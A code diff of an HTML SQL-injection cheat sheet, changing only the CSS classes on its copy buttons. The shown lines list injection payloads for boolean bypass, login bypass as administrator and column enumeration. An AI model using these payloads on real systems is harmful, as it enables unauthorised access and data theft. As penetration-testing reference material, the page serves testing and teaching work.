@@ -56,16 +56,16 @@
 If the vulnerability is present the goal is to "cut" the query and retrieve all, for that boolean 
 conditions are used.
 <div class='parent'>
-<div class='child inline-block-child'><p id="HDT01"><mark>' OR 1=1--</mark></p></div> | <div class='child inline-block-child'><button class="button_conf" onclick="ctrl_C('#HDT01')">ctrl+C</button></div>
-<div class='child inline-block-child'><p id="HDT02"><mark>' and 'a'='a--</mark></p></div> | <div class='child inline-block-child'><button class="button_conf" onclick="ctrl_C('#HDT02')">ctrl+C</button></div>
-<div class='child inline-block-child'><p id="HDT03"><mark>' and 1=2;--</mark></p></div> | <div class='child inline-block-child'><button class="button_conf" onclick="ctrl_C('#HDT03')">ctrl+C</button></div></p></div>
+<div class='child inline-block-child'><p id="HDT01"><mark>' OR 1=1--</mark></p></div> | <div class='child inline-block-child'><button class="button_conf button_set" onclick="ctrl_C('#HDT01')">ctrl+C</button></div>
+<div class='child inline-block-child'><p id="HDT02"><mark>' and 'a'='a--</mark></p></div> | <div class='child inline-block-child'><button class="button_conf button_set" onclick="ctrl_C('#HDT02')">ctrl+C</button></div>
+<div class='child inline-block-child'><p id="HDT03"><mark>' and 1=2;--</mark></p></div> | <div class='child inline-block-child'><button class="button_conf button_set" onclick="ctrl_C('#HDT03')">ctrl+C</button></div></p></div>
 </details>
 <details>
 <summary>LOGIN BYPASS TECHNIQUES</summary>
 <p><b>DESCRIPTION:</b> It is used to bypass login forms, guessing users or after collecting some of them.
 
 Sample:</p><div class='parent'>
-<div class='child inline-block-child'><p id="LBT01"><mark>administrator'--</mark></p></div> | <div class='child inline-block-child'><button class="button_conf" onclick="ctrl_C('#LBT01')">ctrl+C</button></div></div>
+<div class='child inline-block-child'><p id="LBT01"><mark>administrator'--</mark></p></div> | <div class='child inline-block-child'><button class="button_conf button_set" onclick="ctrl_C('#LBT01')">ctrl+C</button></div></div>
 </details>
 <details>
 <summary>DATABASE TYPE/VERSION/NUMBER TECHNIQUES</summary>
@@ -76,8 +76,8 @@ Sample:</p><div class='parent'>
 <b>PRE-REQS:</b>
 1. get column number
 <div class='parent'>
-  <b>method1:</b><div class='child inline-block-child'><p id="DTT01"><mark>' ORDER BY 1--</mark></p></div> | <div class='child inline-block-child'><button class="button_conf onclick="ctrl_C('#DTT01')">ctrl+C</button></div>
-  <b>method2:</b><div class='child inline-block-child'><p id="DTT02"><mark>' UNION SELECT NULL--</mark></p></div> | <div class='child inline-block-child'><button class="button_conf onclick="ctrl_C('#DTT02')">ctrl+C</button></div>
+  <b>method1:</b><div class='child inline-block-child'><p id="DTT01"><mark>' ORDER BY 1--</mark></p></div> | <div class='child inline-block-child'><button class="button_conf button_set" onclick="ctrl_C('#DTT01')">ctrl+C</button></div>
+  <b>method2:</b><div class='child inline-block-child'><p id="DTT02"><mark>' UNION SELECT NULL--</mark></p></div> | <div class='child inline-block-child'><button class="button_conf button_set" onclick="ctrl_C('#DTT02')">ctrl+C</button></div>
 </div>
 	
 2. get field type
